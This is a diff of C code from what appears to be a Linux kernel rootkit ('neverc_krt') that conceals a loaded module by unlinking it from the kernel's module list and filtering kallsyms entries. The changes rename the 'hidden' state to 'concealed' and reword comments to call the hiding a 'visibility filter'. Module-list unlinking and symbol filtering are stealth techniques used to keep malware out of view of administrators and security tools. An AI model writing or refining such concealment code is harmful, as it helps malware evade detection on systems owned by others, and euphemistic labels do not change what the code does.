@@ -71,7 +71,7 @@ static unsigned long              _neverc_krt_vmalloc_vis_start;
 static unsigned long              _neverc_krt_vmalloc_vis_end;
 
 /* ==================================================================== */
-/*  Init / module list conceal+reveal                                    */
+/*  Init / module list visibility filter (conceal + reveal)              */
 /* ==================================================================== */
 
 int neverc_krt_vis_init(void)
@@ -98,7 +98,7 @@ void neverc_krt_vis_conceal(struct neverc_krt_vis_state *state,
 	struct list_head *our;
 	unsigned long n_raw, p_raw;
 
-	if (state->hidden) return;
+	if (state->concealed) return;
 
 	our = _neverc_krt_get_mod_list(mod);
 	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
@@ -126,7 +126,7 @@ void neverc_krt_vis_conceal(struct neverc_krt_vis_state *state,
 	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
 		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
 
-	state->hidden = 1;
+	state->concealed = 1;
 }
 
 void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
@@ -134,7 +134,7 @@ void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
 {
 	struct list_head *our;
 
-	if (!state->hidden) return;
+	if (!state->concealed) return;
 
 	our = _neverc_krt_get_mod_list(mod);
 
@@ -166,7 +166,7 @@ void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
 	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
 		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
 
-	state->hidden = 0;
+	state->concealed = 0;
 }
 
 /* ==================================================================== */
@@ -301,7 +301,7 @@ int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
 }
 
 /* ==================================================================== */
-/*  Composite full-conceal + cleanup                                    */
+/*  Composite full visibility filter + cleanup                          */
 /* ==================================================================== */
 
 void neverc_krt_vis_full_conceal(struct neverc_krt_vis_state *state,
